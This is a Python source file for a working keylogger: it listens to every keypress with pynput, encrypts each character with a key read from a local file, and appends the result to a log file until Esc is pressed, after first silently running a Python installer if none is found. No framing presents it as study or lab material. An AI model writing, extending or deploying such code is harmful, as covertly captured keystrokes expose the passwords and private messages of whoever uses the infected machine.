import subprocess
import os
from pynput import keyboard
from cryptography.fernet import Fernet

def install_python():
    # Check if Python is installed already
    if not os.path.exists("C:\\Python311\\python.exe"):
        python_installer = "python-3.11.9-amd64.exe"
        # Run Python installer silently
        subprocess.run([python_installer, '/quiet', '/norestart'])

def get_encryption_key():
    try:
        with open('ekey.txt', 'r') as key_file:
            key = key_file.read().strip()
        return key.encode()
    except FileNotFoundError:
        raise ValueError("Encryption key file not found.")
    except Exception as e:
        raise ValueError(f"Error reading encryption key: {str(e)}")

key_count = 0

def keyPressed(key):
    global key_count
    encryption_key = get_encryption_key()
    cipher_suite = Fernet(encryption_key)

    try:
        with open("keyfile.txt", 'ab') as logKey:  # Open in binary mode to write encrypted bytes
            if key_count >= 50:
                logKey.write(cipher_suite.encrypt(b'\n'))  # New line every 50 inputs to keep clean
                key_count = 0
            try:
                char = key.char
                logKey.write(cipher_suite.encrypt(char.encode()))
            except AttributeError:
                # Handle special keys
                if key == keyboard.Key.space:
                    logKey.write(cipher_suite.encrypt(b' '))  # When Space is pressed write ' ' instead of key.space
                else:
                    logKey.write(cipher_suite.encrypt(f'[{key}]'.encode()))
    except Exception as e:
        print(f"Error logging key: {str(e)}")  # Print any errors encountered during logging

    key_count += 1  

    if key == keyboard.Key.esc:
        return False

if __name__ == "__main__":
    install_python()

    # Ensure the keyfile.txt is empty at the start
    open("keyfile.txt", 'wb').close()  # Open in binary mode to create an empty file

    
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    listener.join()  
    input()  
